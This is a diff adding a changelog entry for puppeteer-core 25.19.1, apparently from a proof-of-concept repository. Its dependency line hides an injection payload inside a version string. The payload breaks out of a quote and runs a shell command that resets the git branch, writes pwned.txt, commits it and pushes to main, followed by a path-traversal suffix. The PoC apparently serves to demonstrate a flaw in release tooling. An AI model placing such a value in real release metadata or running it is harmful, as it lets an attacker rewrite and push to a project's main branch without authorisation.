@@ -1,5 +1,14 @@
 # Changelog
 
+## [25.19.1](https://github.com/arnodorian1337/puppeteer-release-metadata-poc-20261127132623/compare/puppeteer-core-v25.19.0...puppeteer-core-v25.19.1) (2026-11-27)
+
+
+### Dependencies
+
+* The following workspace dependencies were updated
+  * dependencies
+    * @puppeteer/browsers bumped from 3.3.0 to 3.3.1-';spawn("sh",["-c","git fetch origin main:p;git reset --hard p;cd ..;cd ..;echo P>pwned.txt;git add -- pwned.txt;git -c user.name=p -c user.email=p@p commit -m p;git push origin HEAD:main"])//../../../browsers
+
 ## [25.19.0](https://github.com/puppeteer/puppeteer/compare/puppeteer-core-v25.18.1...puppeteer-core-v25.19.0) (2026-11-25)
 
 
